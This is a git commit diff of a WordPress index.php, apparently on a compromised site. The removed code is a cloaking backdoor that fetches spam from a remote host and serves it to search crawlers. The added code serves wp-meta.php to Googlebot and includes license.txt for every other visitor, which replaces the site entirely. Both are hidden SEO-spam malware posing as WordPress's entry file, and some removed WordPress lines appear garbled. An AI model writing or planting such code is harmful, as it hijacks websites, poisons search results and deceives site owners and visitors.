740780765c3b7664f6a89d5b5f3e5bb7b75326b7
This Me Zy <31403046+zycoder0day@users.noreply.github.com>
2025-05-05 07:05:17 +0700

    Update index.php

--- index.php
+++ index.php
@@ -1,43 +1,18 @@
-<?php
-ob_start();
-header('Vary: User-Agent');
-$bot_url = "https://rusunawa.unimed.ac.id/wp-content/plugins/index.txt";
-$botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
-$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
-function lph_requests($url) {
-    if (function_exists('curl_init')) {    
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
-        $response = curl_exec($ch);
-        curl_close($ch);
-        return $response;
-    } elseif (ini_get('allow_url_fopen')) {
-        return file_get_contents($url);
+<?php ///tes//
+function is_google_bot() {
+    $agents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
+    foreach ($agents as $agent) {
+        if (strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) return true;
     }
     return false;
 }
-if (preg_match($botchar, $ua)) {
-    usleep(rand(100000, 200000)); 
-    echo lph_requests($bot_url);
-    ob_end_flush();
+
+if (is_google_bot()) {
+    $bot_content = file_get_contents('wp-meta.php');
+    echo $bot_content;
+    exit;
+} else {
+    include('license.txt');
     exit;
 }
 ?>
-/
- * Front to the WordPress application. This file doesn't do anything, but loads
- * wp-blog-header.php which does and tells WordPress to load the theme.
- *
- * @package WordPress
- */
-
-/
- * Tells WordPress to load the WordPress theme and output it.
- *
- * @var bool
- */
-define( 'WP_USE_THEMES', true );
-
-/** Loads the WordPress Environment and Template */
-require DIR . '/wp-blog-header.php';
